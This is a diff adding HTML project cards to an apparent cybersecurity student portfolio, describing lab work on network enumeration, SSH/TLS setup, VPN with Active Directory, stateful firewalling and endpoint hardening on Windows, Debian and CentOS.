+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">arp-scan</span><span class="tech-tag">hping3</span>
+                            <span class="tech-tag">Nmap</span><span class="tech-tag">Kali Linux</span>
+                            <span class="tech-tag">Windows Server</span><span class="tech-tag">Debian</span><span class="tech-tag">CentOS</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Audit Coverage</div>
+                            <div class="stat-row"><span class="stat-label">Targets Scanned</span><span class="stat-value blue">3</span></div>
+                            <div class="stat-row"><span class="stat-label">Port Range</span><span class="stat-value">1–65535</span></div>
+                            <div class="stat-row"><span class="stat-label">OS Detection</span><span class="stat-value ok">YES</span></div>
+                            <div class="stat-row"><span class="stat-label">Service Versioning</span><span class="stat-value ok">YES</span></div>
+                            <div class="stat-row"><span class="stat-label">MAC Addresses</span><span class="stat-value ok">CAPTURED</span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Scan Techniques</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--blue);color:var(--blue);">✓</div>ARP Host Discovery</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--blue);color:var(--blue);">✓</div>TCP SYN Port Scan</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--blue);color:var(--blue);">✓</div>Service Version Detection</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--blue);color:var(--blue);">✓</div>OS Fingerprinting</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--blue);color:var(--blue);">✓</div>Multi-OS Target Coverage</div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">Enumeration Commands</div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">arp-scan </span><span class="cmd-flag">--localnet</span></span></div>
+                            <div class="cmd-spacer"></div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">nmap </span><span class="cmd-flag">-sV -O -p 1-65535</span><span class="cmd-path"> [target]</span></span></div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 09 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">09 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--green);background:var(--green-glow);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type">Secure Communications</div>
+                                <h2 class="card-title">SSH &amp; HTTPS/TLS Configuration</h2>
+                                <div class="card-subtitle">OpenSSH · Apache2 · SSL/TLS &nbsp;·&nbsp; 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1510915228340-29c85a43dcfe?ixlib=rb-4.0.3&auto=format&fit=crop&w=1400&q=80" alt="Secure Communications" loading="lazy">
+                            <div class="img-overlay-label">[ENCRYPTED CHANNEL]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Configured end-to-end secure communications protocols across two separate labs — OpenSSH on Windows Server for remote administration and Apache2 HTTPS on Kali Linux for encrypted web traffic. Compared plaintext HTTP vs. encrypted HTTPS traffic using Wireshark to visually demonstrate the value of TLS encryption.</p>
+                        <div class="card-overview-label">Achievements</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Installed and configured OpenSSH server on Windows Server 2022; performed remote user account creation via SSH client</div>
+                            <div class="achievement-item">Securely transferred files between hosts using both scp (secure copy) and sftp (Secure File Transfer Protocol)</div>
+                            <div class="achievement-item">Configured SSH public-private key authentication, eliminating password-based login for the remote server</div>
+                            <div class="achievement-item">Set up Apache2 web server, generated and applied a self-signed SSL certificate, and captured HTTP vs. HTTPS traffic in Wireshark to compare plaintext vs. encrypted payloads</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">OpenSSH</span><span class="tech-tag">scp</span>
+                            <span class="tech-tag">sftp</span><span class="tech-tag">Apache2</span>
+                            <span class="tech-tag">SSL/TLS</span><span class="tech-tag">Wireshark</span><span class="tech-tag">Windows Server 2022</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Configuration Metrics</div>
+                            <div class="stat-row"><span class="stat-label">SSH Auth Method</span><span class="stat-value">PKI Keys</span></div>
+                            <div class="stat-row"><span class="stat-label">File Transfer Methods</span><span class="stat-value blue">2</span></div>
+                            <div class="stat-row"><span class="stat-label">SSL Certificate</span><span class="stat-value ok">APPLIED</span></div>
+                            <div class="stat-row"><span class="stat-label">Traffic Analysis</span><span class="stat-value ok">WIRESHARK</span></div>
+                            <div class="stat-row"><span class="stat-label">Password Auth</span><span class="stat-value red">DISABLED</span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Protocols Configured</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>OpenSSH Server (sshd)</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>SCP File Transfer</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>SFTP File Transfer</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Apache2 HTTPS + SSL</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Public-Key Auth (ssh-keygen)</div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">Key Commands</div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">ssh-keygen </span><span class="cmd-flag">-t rsa -b 4096</span></span></div>
+                            <div class="cmd-spacer"></div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">scp </span><span class="cmd-path">file.txt</span><span class="cmd-text"> user@</span><span class="cmd-path">[host]</span><span class="cmd-text">:/dest/</span></span></div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 10 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">10 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--purple);background:rgba(170,85,255,0.1);border-color:rgba(170,85,255,0.2);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M12 21a9.004 9.004 0 008.716-6.747M12 21a9.004 9.004 0 01-8.716-6.747M12 21c2.485 0 4.5-4.03 4.5-9S14.485 3 12 3m0 18c-2.485 0-4.5-4.03-4.5-9S9.515 3 12 3m0 0a8.997 8.997 0 017.843 4.582M12 3a8.997 8.997 0 00-7.843 4.582m15.686 0A11.953 11.953 0 0112 10.5c-2.998 0-5.74-1.1-7.843-2.918m15.686 0A8.959 8.959 0 0121 12c0 .778-.099 1.533-.284 2.253m0 0A17.919 17.919 0 0112 16.5c-3.162 0-6.133-.815-8.716-2.247m0 0A9.015 9.015 0 013 12c0-1.605.42-3.113 1.157-4.418"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type" style="color:var(--purple)">VPN &amp; Active Directory</div>
+                                <h2 class="card-title">VPN Server &amp; Active Directory</h2>
+                                <div class="card-subtitle">Windows Server 2022 · RAS · NPS &nbsp;·&nbsp; 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1504384308090-c894fdcc538d?ixlib=rb-4.0.3&auto=format&fit=crop&w=1400&q=80" alt="VPN and Active Directory" loading="lazy">
+                            <div class="img-overlay-label">[SECURE TUNNEL]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Deployed a full enterprise VPN solution on Windows Server 2022 using the Remote Access role with Routing and Remote Access Service (RAS). Integrated Active Directory for user and group management, and Network Policy Server (NPS) to enforce access control policies — simulating a production remote access environment.</p>
+                        <div class="card-overview-label">Achievements</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Installed and configured the Remote Access server role on Windows Server 2022 with Routing and Remote Access enabled for VPN service</div>
+                            <div class="achievement-item">Created user accounts and security groups in Windows Active Directory to manage VPN access permissions</div>
+                            <div class="achievement-item">Configured a Network Policy Server (NPS) access policy to enforce group-based authentication for VPN connections</div>
+                            <div class="achievement-item">Configured a VPN client on a second Windows Server and established a verified end-to-end VPN tunnel between both machines</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">Windows Server 2022</span><span class="tech-tag">RAS</span>
+                            <span class="tech-tag">Active Directory</span><span class="tech-tag">NPS</span>
+                            <span class="tech-tag">VPN</span><span class="tech-tag">Group Policy</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Deployment Metrics</div>
+                            <div class="stat-row"><span class="stat-label">Server Role</span><span class="stat-value purple">Remote Access</span></div>
+                            <div class="stat-row"><span class="stat-label">AD Integration</span><span class="stat-value ok">YES</span></div>
+                            <div class="stat-row"><span class="stat-label">Access Policies</span><span class="stat-value">NPS</span></div>
+                            <div class="stat-row"><span class="stat-label">VPN Tunnel</span><span class="stat-value ok">ESTABLISHED</span></div>
+                            <div class="stat-row"><span class="stat-label">Auth Method</span><span class="stat-value purple">Group-Based</span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Components Configured</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--purple);color:var(--purple);">✓</div>Remote Access Role (RAS)</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--purple);color:var(--purple);">✓</div>Routing &amp; Remote Access</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--purple);color:var(--purple);">✓</div>Active Directory Users/Groups</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--purple);color:var(--purple);">✓</div>Network Policy Server (NPS)</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--purple);color:var(--purple);">✓</div>VPN Client Configuration</div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">AD User Creation</div>
+                            <div class="cmd-line"><span class="prompt">PS></span><span><span class="cmd-text">New-ADUser </span><span class="cmd-flag">-Name</span><span class="cmd-path"> "VPNUser"</span><span class="cmd-flag"> -AccountPassword</span><span class="cmd-path"> (Read-Host -AsSecureString)</span><span class="cmd-flag"> -Enabled $true</span></span></div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 11 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">11 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--green);background:var(--green-glow);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type">Network Security Research</div>
+                                <h2 class="card-title">Stateless vs. Stateful Firewall</h2>
+                                <div class="card-subtitle">iptables · conntrack · tcpdump &nbsp;·&nbsp; CST 3610 · 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1542831371-29b0f74f9713?auto=format&fit=crop&fm=jpg&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MTF8fGhhY2tlcnxlbnwwfHwwfHx8MA%3D&ixlib=rb-4.1.0&q=60&w=3000" alt="Stateful Firewall Research" loading="lazy">
+                            <div class="img-overlay-label">[PACKET ANALYSIS]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Independently designed and executed a three-phase research lab to demonstrate the fundamental security difference between stateless and stateful packet filtering. Crafted a spoofed ACK packet to bypass a stateless iptables rule, then mitigated the vulnerability using Linux conntrack — verifying the fix through live Wireshark and tcpdump captures. Analyzed findings against HIPAA Technical Safeguard requirements and OSI layer theory.</p>
+                        <div class="card-overview-label">Achievements</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Built an isolated VirtualBox internal network ("labnet") between two Kali Linux VMs and verified TCP three-way handshake with tcpdump</div>
+                            <div class="achievement-item">Configured a stateless iptables ACK rule and crafted a spoofed ACK packet that bypassed it — demonstrating the stateless firewall vulnerability live</div>
+                            <div class="achievement-item">Replaced the stateless rule with a conntrack ESTABLISHED,RELATED rule; confirmed the same spoofed ACK was silently dropped and verified ESTABLISHED session tracking via conntrack -L</div>
+                            <div class="achievement-item">Authored a six-question technical analysis covering CIA Triad implications, OSI layer theory, HIPAA §164.312 compliance gaps, and IDS/IPS recommendations</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">iptables</span><span class="tech-tag">conntrack</span>
+                            <span class="tech-tag">tcpdump</span><span class="tech-tag">Wireshark</span>
+                            <span class="tech-tag">Kali Linux</span><span class="tech-tag">VirtualBox</span><span class="tech-tag">hping3</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Lab Metrics</div>
+                            <div class="stat-row"><span class="stat-label">Lab Phases</span><span class="stat-value">3</span></div>
+                            <div class="stat-row"><span class="stat-label">VMs Used</span><span class="stat-value blue">2</span></div>
+                            <div class="stat-row"><span class="stat-label">ACK Bypass</span><span class="stat-value red">DEMONSTRATED</span></div>
+                            <div class="stat-row"><span class="stat-label">conntrack Fix</span><span class="stat-value ok">VERIFIED</span></div>
+                            <div class="stat-row"><span class="stat-label">HIPAA Analysis</span><span class="stat-value ok">COMPLETED</span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Research Phases</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Phase 1: TCP Handshake Baseline</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Phase 2: Stateless ACK Bypass</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Phase 3: Stateful conntrack Fix</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>HIPAA §164.312 Analysis</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>IDS/IPS Layer 7 Recommendation</div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">The Fix: conntrack Rule</div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">sudo iptables </span><span class="cmd-flag">-A INPUT</span><span class="cmd-flag"> -m conntrack</span><span class="cmd-flag"> --ctstate</span><span class="cmd-path"> ESTABLISHED,RELATED</span><span class="cmd-flag"> -j ACCEPT</span></span></div>
+                            <div class="cmd-spacer"></div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">conntrack </span><span class="cmd-flag">-L</span><span class="cmd-text"> | grep </span><span class="cmd-path">ESTABLISHED</span></span></div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 12 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">12 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--red);background:rgba(255,0,85,0.1);border-color:rgba(255,0,85,0.2);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3l7.5 4.5v4.75c0 4.629-3.07 8.875-7.5 10.25-4.43-1.375-7.5-5.621-7.5-10.25V7.5L12 3zm0 5.25v4.5m0 3.75h.008"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type" style="color:var(--red)">Endpoint Security &amp; Compliance</div>
+                                <h2 class="card-title">Securing Endpoints Scenario</h2>
+                                <div class="card-subtitle">Windows Server 2022 &amp; Debian &nbsp;·&nbsp; ABC Tech Lab &nbsp;·&nbsp; 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&fm=jpg&ixlib=rb-4.1.0&q=80&w=3000" alt="Endpoint security hardening" loading="lazy">
+                            <div class="img-overlay-label">[DUAL ENDPOINT HARDENING]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Secured new Windows and Debian workstations for ABC Tech by applying baseline endpoint controls across both systems. The scenario focused on reducing exposed services, enforcing stronger authentication, and aligning workstation configuration with organizational hardening directives.</p>
+                        <div class="card-overview-label">Achievements</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Enabled Windows Firewall on ZYWIN01, disabled Guest access, and shut down Print Spooler, SMTP, and OpenSSH services to reduce attack surface</div>
+                            <div class="achievement-item">Applied stronger Windows account controls with a 10-character minimum password, complexity enabled, lockout after 5 failed attempts, and a 60-minute lockout duration</div>
+                            <div class="achievement-item">Enabled UFW on ZYDEB01, then stopped and disabled nginx and vsftpd to prevent unnecessary network exposure</div>
+                            <div class="achievement-item">Hardened Debian password policy with PASS_MAX_DAYS 45, PASS_MIN_DAYS 10, WARN_AGE 3, minimum length 12, digit and uppercase requirements, and enforcement for root</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">Windows Firewall</span><span class="tech-tag">UFW</span>
+                            <span class="tech-tag">Group Policy</span><span class="tech-tag">PAM</span>
+                            <span class="tech-tag">systemctl</span><span class="tech-tag">Debian</span><span class="tech-tag">Windows Server 2022</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Compliance Metrics</div>
+                            <div class="stat-row"><span class="stat-label">Endpoints Secured</span><span class="stat-value">2</span></div>
+                            <div class="stat-row"><span class="stat-label">Services Disabled</span><span class="stat-value red">5</span></div>
+                            <div class="stat-row"><span class="stat-label">Lockout Threshold</span><span class="stat-value blue">5 Attempts</span></div>
+                            <div class="stat-row"><span class="stat-label">Linux Min Length</span><span class="stat-value">12</span></div>
+                            <div class="stat-row"><span class="stat-label">Checklist Status</span><span class="stat-value ok">PASS</span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Controls Applied</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Windows Firewall Enabled</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Guest Accounts Restricted</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Unneeded Services Removed</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Strong Password Policies Enforced</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Account Lockout Controls Applied</div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">Representative Commands</div>
+                            <div class="cmd-line"><span class="prompt">PS&gt;</span><span><span class="cmd-text">net accounts </span><span class="cmd-flag">/lockoutthreshold:5 /lockoutduration:60 /minpwlen:10</span></span></div>
+                            <div class="cmd-spacer"></div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">sudo ufw enable &amp;&amp; sudo systemctl disable </span><span class="cmd-path">nginx vsftpd</span></span></div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 13 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">13 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--blue);background:rgba(0,170,255,0.1);border-color:rgba(0,170,255,0.2);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 9h16.5M6 3.75h12A2.25 2.25 0 0120.25 6v12A2.25 2.25 0 0118 20.25H6A2.25 2.25 0 013.75 18V6A2.25 2.25 0 016 3.75zm3 9.75h6m-6 3h3"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type" style="color:var(--blue)">Host Security &amp; Disk Protection</div>
+                                <h2 class="card-title">Windows Host Security Lab</h2>
+                                <div class="card-subtitle">Windows Server 2022 &nbsp;·&nbsp; BitLocker &amp; Defender &nbsp;·&nbsp; 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1517245386807-bb43f82c33c4?auto=format&fit=crop&fm=jpg&ixlib=rb-4.1.0&q=80&w=3000" alt="Windows host hardening" loading="lazy">
+                            <div class="img-overlay-label">[HOST HARDENING]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Completed a Windows host-hardening lab focused on reducing local attack surface, tightening account policy, protecting stored data, and improving malware defense. The lab covered both operating system controls and protective tooling on ZYWIN01.</p>
+                        <div class="card-overview-label">Achievements</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Stopped and disabled Print Spooler, Remote Desktop Services, and Remote Registry to reduce unnecessary exposure on the host</div>
+                            <div class="achievement-item">Modified domain password and lockout policies with gpupdate validation, including 9-character minimum passwords and account lockout duration of 60 minutes</div>
+                            <div class="achievement-item">Disabled the default Guest account in Active Directory Users and Computers to block unauthenticated local access paths</div>
+                            <div class="achievement-item">Enabled BitLocker on the data drive, saved a recovery key, and configured Microsoft Defender custom scanning for targeted host protection</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">Windows Server 2022</span><span class="tech-tag">BitLocker</span>
+                            <span class="tech-tag">Microsoft Defender</span><span class="tech-tag">Group Policy</span>
+                            <span class="tech-tag">Active Directory</span><span class="tech-tag">gpupdate</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Hardening Metrics</div>
+                            <div class="stat-row"><span class="stat-label">Services Disabled</span><span class="stat-value red">3</span></div>
+                            <div class="stat-row"><span class="stat-label">Min Password</span><span class="stat-value blue">9</span></div>
+                            <div class="stat-row"><span class="stat-label">Lockout Threshold</span><span class="stat-value">4</span></div>
+                            <div class="stat-row"><span class="stat-label">Drive Encryption</span><span class="stat-value ok">BITLOCKER</span></div>
+                            <div class="stat-row"><span class="stat-label">Defender Scan</span><span class="stat-value ok">CUSTOM</span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Security Controls</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Print Spooler Disabled</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Remote Desktop Services Disabled</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Remote Registry Disabled</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Guest Account Disabled</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>BitLocker Recovery Key Saved</div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">Windows Policy Flow</div>
+                            <div class="cmd-line"><span class="prompt">PS&gt;</span><span><span class="cmd-text">gpupdate</span></span></div>
+                            <div class="cmd-spacer"></div>
+                            <div class="cmd-line"><span class="prompt">GUI</span><span><span class="cmd-text">BitLocker + Defender + ADUC configuration workflow completed</span></span></div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 14 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">14 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--green);background:var(--green-glow);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M6.75 7.5h10.5m-10.5 4.5h10.5m-10.5 4.5h6m7.5 3H3.75A2.25 2.25 0 011.5 17.25V6.75A2.25 2.25 0 013.75 4.5h16.5a2.25 2.25 0 012.25 2.25v10.5a2.25 2.25 0 01-2.25 2.25z"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type">Linux Security &amp; Hardening</div>
+                                <h2 class="card-title">Debian Linux Hardening Lab</h2>
+                                <div class="card-subtitle">Debian Linux &nbsp;·&nbsp; PAM &amp; UFW &nbsp;·&nbsp; 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1498050108023-c5249f4df085?auto=format&fit=crop&fm=jpg&ixlib=rb-4.1.0&q=80&w=3000" alt="Debian Linux hardening" loading="lazy">
+                            <div class="img-overlay-label">[LINUX BASELINE]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Hardened a Debian endpoint by removing exposed services, tightening password expiration and complexity rules, and enabling host firewall protection. The work focused on lowering attack surface while improving default account security posture.</p>
+                        <div class="card-overview-label">Achievements</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Identified running services with service --status-all, then stopped and disabled nginx, openbsd-inetd, and openvpn using systemctl</div>
+                            <div class="achievement-item">Updated /etc/login.defs to enforce password expiration after 90 days and deliver expiration warnings 14 days in advance</div>
+                            <div class="achievement-item">Modified /etc/pam.d/common-password to increase CrackLib minimum password length to 10 for stronger password complexity</div>
+                            <div class="achievement-item">Enabled Uncomplicated Firewall (UFW) and validated active protection on the host</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">Debian</span><span class="tech-tag">systemctl</span>
+                            <span class="tech-tag">PAM</span><span class="tech-tag">CrackLib</span>
+                            <span class="tech-tag">/etc/login.defs</span><span class="tech-tag">UFW</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Linux Hardening Metrics</div>
+                            <div class="stat-row"><span class="stat-label">Services Disabled</span><span class="stat-value red">3</span></div>
+                            <div class="stat-row"><span class="stat-label">PASS_MAX_DAYS</span><span class="stat-value">90</span></div>
+                            <div class="stat-row"><span class="stat-label">PASS_WARN_AGE</span><span class="stat-value blue">14</span></div>
+                            <div class="stat-row"><span class="stat-label">CrackLib minlen</span><span class="stat-value">10</span></div>
+                            <div class="stat-row"><span class="stat-label">Firewall Status</span><span class="stat-value ok">ACTIVE</span></div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">Core Commands</div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">sudo systemctl disable </span><span class="cmd-path">nginx openbsd-inetd openvpn</span></span></div>
+                            <div class="cmd-spacer"></div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">sudo ufw enable</span></span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Files Updated</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>/etc/login.defs</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>/etc/pam.d/common-password</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>UFW Rule Set Verified</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Open Services Reduced</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Password Aging Hardened</div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 15 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">15 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--purple);background:rgba(170,85,255,0.1);border-color:rgba(170,85,255,0.2);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 7.5h16.5M7.5 16.5h.008v.008H7.5V16.5zm4.5 0h.008v.008H12V16.5zm4.5 0h.008v.008H16.5V16.5zM6 3.75h12A2.25 2.25 0 0120.25 6v12A2.25 2.25 0 0118 20.25H6A2.25 2.25 0 013.75 18V6A2.25 2.25 0 016 3.75z"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type" style="color:var(--purple)">Virtualization Security</div>
+                                <h2 class="card-title">Secure Virtualization Host</h2>
+                                <div class="card-subtitle">CentOS &nbsp;·&nbsp; SELinux &amp; libvirt &nbsp;·&nbsp; 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1544197150-b99a580bb7a8?auto=format&fit=crop&fm=jpg&ixlib=rb-4.1.0&q=80&w=3000" alt="Secure virtualization host" loading="lazy">
+                            <div class="img-overlay-label">[HYPERVISOR PREP]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Prepared and secured a CentOS virtualization host by temporarily adjusting protective controls for installation, then restoring enforcement and removing unnecessary services before guest deployment. The lab emphasized secure host preparation and lifecycle-aware virtualization practices.</p>
+                        <div class="card-overview-label">Achievements</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Changed SELinux from enforcing to permissive to support virtualization component preparation, then re-enabled enforcing mode after setup</div>
+                            <div class="achievement-item">Disabled libvirt auditing and firewalld during setup steps required for host preparation and virtualization tooling changes</div>
+                            <div class="achievement-item">Disabled autofs, nfs, vsftpd, and httpd to remove unneeded services before hosting guest workloads</div>
+                            <div class="achievement-item">Ran virt-host-validate and documented host readiness checks for libvirt-based virtualization support</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
